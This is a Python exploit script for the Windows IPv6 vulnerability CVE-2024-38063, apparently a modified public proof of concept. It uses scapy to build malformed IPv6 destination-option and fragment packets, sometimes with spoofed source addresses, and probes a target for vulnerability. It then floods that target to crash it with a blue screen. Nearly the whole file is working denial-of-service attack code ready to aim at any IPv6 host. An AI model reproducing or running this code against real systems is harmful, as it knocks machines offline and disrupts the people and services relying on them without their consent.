#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Exploit Title: Windows IPv6 CVE-2024-38063 Checker and Denial-Of-Service (Enhanced & Spicy)
# Date: 2024-08-07
# Exploit Author: Photubias (Heavily Modified by ZeroEthical)
# Vendor Homepage: https://microsoft.com
# Vendor Advisory: [1] https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-38063
# Version: Windows 10, 11 <10.0.26100.1457 and Server 2016-2019-2022 <10.0.17763.6189
# Tested on: Windows 11 23H2 and Windows Server 2022
# CVE: CVE-2024-38063

import os, subprocess, re, time, sys, random, logging
from scapy.config import conf
conf.ipv6_enabled = False
import scapy.all as scapy
scapy.conf.verb = 0

# Configure logging
logging.basicConfig(filename='cve-2024-38063.log', level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

## Variables
sDstIP = None
if len(sys.argv) > 1: sDstIP = sys.argv[1]
sDstMAC = None
iBatches = 20
iCorruptions = 20
payload_choices = [b"notalive", b"deadbeef", b"AAAAAAAAAAAAAAAA"] # Add more interesting payloads
fragment_offsets = [0, 1, 8, 16] # Experiment with fragment offsets

def selectInterface():
    def getAllInterfaces():
        lstInterfaces=[]
        if os.name == 'nt':
            proc = subprocess.Popen('getmac /NH /V /FO csv | FINDSTR /V /I disconnected', shell=True, stdout=subprocess.PIPE)
            for bInterface in proc.stdout.readlines():
                lstInt = bInterface.split(b',')
                sAdapter = lstInt[0].strip(b'"').decode()
                sDevicename = lstInt[1].strip(b'"').decode()
                sMAC = lstInt[2].strip(b'"').decode().lower().replace('-', ':')
                sWinguID = lstInt[3].strip().strip(b'"').decode()[-38:]
                proc = subprocess.Popen('netsh int ipv6 show addr "{}" | FINDSTR /I Address'.format(sAdapter), shell=True, stdout=subprocess.PIPE)
                try: sIP = re.findall(r'[\w:]+:+[\w:]+', proc.stdout.readlines()[0].strip().decode())[0]
                except: sIP = ''
                if len(sMAC) == 17: lstInterfaces.append([sAdapter, sIP, sMAC, sDevicename, sWinguID])
        else:
            proc = subprocess.Popen('for i in $(ip address | grep -v "lo" | grep "default" | cut -d":" -f2 | cut -d" " -f2);do echo $i $(ip address show dev $i | grep "inet6 " | cut -d" " -f6 | cut -d"/" -f1) $(ip address show dev $i | grep "ether" | cut -d" " -f6);done', shell=True, stdout=subprocess.PIPE)
            for bInterface in proc.stdout.readlines():
                lstInt = bInterface.strip().split(b' ')
                try:
                    if len(lstInt[2]) == 17: lstInterfaces.append([lstInt[0].decode(), lstInt[1].decode(), lstInt[2].decode(), '', ''])
                except: pass
        return lstInterfaces

    lstInterfaces = getAllInterfaces()
    if len(lstInterfaces) > 1:
        i = 1
        for lstInt in lstInterfaces:
            print('[{}] {} has {} ({})'.format(i, lstInt[2], lstInt[1], lstInt[0]))
            i += 1
        while True:
            sAnswer = input('[?] Please select the adapter [1]: ')
            if not sAnswer:
                sAnswer = '1'
            if sAnswer.isdigit() and 1 <= int(sAnswer) < i:
                break
            else:
                print("Invalid input. Please enter a number from the list.")
    else: sAnswer = '1'
    iAnswer = int(sAnswer) - 1
    sNPF = lstInterfaces[iAnswer][0]
    sIP = lstInterfaces[iAnswer][1]
    sMAC = lstInterfaces[iAnswer][2]
    if os.name == 'nt': sNPF = r'\Device\NPF_' + lstInterfaces[iAnswer][4]
    return (sNPF, sIP, sMAC, lstInterfaces[iAnswer][3])

def generate_random_ipv6():
    # Generate a random, likely invalid, IPv6 address for spoofing
    return 'fc00::{:04x}:{:04x}:{:04x}:{:04x}'.format(random.randint(0, 65535), random.randint(0, 65535), random.randint(0, 65535), random.randint(0, 65535))

def get_packets(iID, sDstIPv6, sDstMac=None):
    iFragID = 0xbedead00 + iID
    flow_label = random.randint(0, 0xFFFFF)
    hop_limit = random.randint(1, 255)
    bad_data = os.urandom(random.randint(1, 16))
    src_ip = generate_random_ipv6() if random.random() < 0.5 else None # Spoof source IP sometimes
    payload = random.choice(payload_choices)
    frag_offset = random.choice(fragment_offsets)

    oPacket1 = scapy.IPv6(fl=flow_label, hlim=hop_limit, src=src_ip, dst=sDstIPv6) / scapy.IPv6ExtHdrDestOpt(options=[scapy.PadN(otype=0x81, optdata=bad_data)])
    oPacket2 = scapy.IPv6(fl=flow_label, hlim=hop_limit, src=src_ip, dst=sDstIPv6) / scapy.IPv6ExtHdrFragment(id=iFragID, m = 1, offset = frag_offset) / payload
    oPacket3 = scapy.IPv6(fl=flow_label, hlim=hop_limit, src=src_ip, dst=sDstIPv6) / scapy.IPv6ExtHdrFragment(id=iFragID, m = 0, offset = frag_offset + 1)
    if sDstMac:
        oPacket1 = scapy.Ether(dst=sDstMAC) / oPacket1
        oPacket2 = scapy.Ether(dst=sDstMAC) / oPacket2
        oPacket3 = scapy.Ether(dst=sDstMAC) / oPacket3
    return [oPacket1, oPacket2, oPacket3]

def doIPv6ND(sDstIP, sInt):
    sMACResp = None
    oNeighborSollicitation = scapy.IPv6(dst=sDstIP) / scapy.ICMPv6ND_NS(tgt=sDstIP) / scapy.ICMPv6NDOptSrcLLAddr(lladdr='ff:ff:ff:ff:ff:ff')
    try:
        oResponse = scapy.sr1(oNeighborSollicitation, timeout=5, iface=sInt, verbose=False)
        if oResponse and scapy.ICMPv6NDOptDstLLAddr in oResponse:
            sMACResp = oResponse[scapy.ICMPv6NDOptDstLLAddr].lladdr
    except Exception as e:
        print(f"[-] Error during Neighbor Solicitation: {e}")
    return sMACResp

lstInt = selectInterface()

if not sDstIP:
    sDstIP = input("[?] Enter target IPv6 address: ")

print(f"[*] Using interface: {lstInt[3]} ({lstInt[1]})")
logging.info(f"Starting exploit against target {sDstIP} using interface {lstInt[3]} ({lstInt[1]})")

sMAC = doIPv6ND(sDstIP, lstInt[0])
if sMAC:
    print(f'[+] Target {sDstIP} is reachable via ND, got MAC Address {sMAC}')
    sDstMAC = sMAC
elif sDstMAC:
    print('[-] Target not responding to Neighbor Sollicitation Packets, using the provided MAC {}'.format(sDstMAC))
else:
    print('[-] Without a MAC address from ND, the exploit might be less reliable.')

lstPacketsToSend = []
print("[*] Generating attack packets...")
for i in range(iBatches):
    for j in range(iCorruptions):
        lstPacketsToSend += get_packets(j, sDstIP, sDstMAC) + get_packets(j, sDstIP, sDstMAC)

print('[i] Verifying vulnerability against IPv6 address {}'.format(sDstIP))
if lstPacketsToSend:
    lstResp = scapy.srp1(lstPacketsToSend[0], iface=lstInt[0], timeout=5, verbose=False)
    if lstResp and scapy.IPv6 in lstResp and scapy.ICMPv6ParamProblem in lstResp:
        print('[+] Yes, {} is likely vulnerable and exploitable for CVE-2024-38063'.format(sDstIP))
        logging.info(f"Target {sDstIP} is likely vulnerable.")
    else:
        input('[-] Not vulnerable or firewall is enabled, or no response. Please verify and rerun or press enter to continue')
        logging.info(f"Target {sDstIP} does not seem vulnerable or is protected.")
    print('[i] Waiting 10 seconds to let the target cool down (more is better)')
    time.sleep(10)
    input('[?] OK, continue to execute the Denial Of Service (BSOD)? Press Ctrl+C to cancel now')
    ########## Exploit
    print('[+] Sending {} packets now via interface {} {}'.format(len(lstPacketsToSend), lstInt[0], lstInt[3]))
    logging.info(f"Sending {len(lstPacketsToSend)} packets.")
    scapy.conf.verb = 1
    try:
        scapy.sendp(lstPacketsToSend, iface=lstInt[0])
        print('[+] All packets are sent, now it takes *exactly* 60 segundos (or less) for the target to crash, if vulnerable.')
        logging.info("All packets sent.")
    except Exception as e:
        print(f"[-] Error sending packets: {e}")
        logging.error(f"Error sending packets: {e}")
else:
    print("[-] No packets to send. Something went wrong.")
    logging.error("No packets to send.")

print("[*] Done!")
logging.info("Exploit finished.")